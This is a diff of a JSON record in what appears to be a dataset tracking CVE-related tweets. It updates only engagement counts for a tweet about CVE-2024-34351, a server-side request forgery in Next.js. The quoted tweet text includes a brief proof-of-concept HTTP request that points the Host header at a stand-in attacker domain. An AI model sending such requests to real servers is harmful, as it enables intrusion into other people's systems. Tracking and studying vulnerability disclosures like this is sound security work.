@@ -408,10 +408,10 @@
         "https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g",
         "https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps"
     ],
-    "tweetfavorites": 367,
+    "tweetfavorites": 365,
     "tweetquotes": 1,
     "tweetreplies": 3,
-    "tweetretweets": 67,
+    "tweetretweets": 70,
     "tweettext": "CVE-2024-34351 : Server-Side Request Forgery on Next.js \n\nhttps://t.co/uHkC2VUHzr\nhttps://t.co/6o8dNJxDuz\n\nPOC:\n\nPOST /x HTTP/2\nHost: attacker*com\nContent-Length: 2\nNext-Action: xxxx\n\n{}\n#BugBounty #bugbountytips https://t.co/7sAHSmSiZ9",
     "tweettime": "2024-05-09, 23:20:58",
     "tweeturl": "https://twitter.com/h4x0r_dz/status/1788710784849059851",
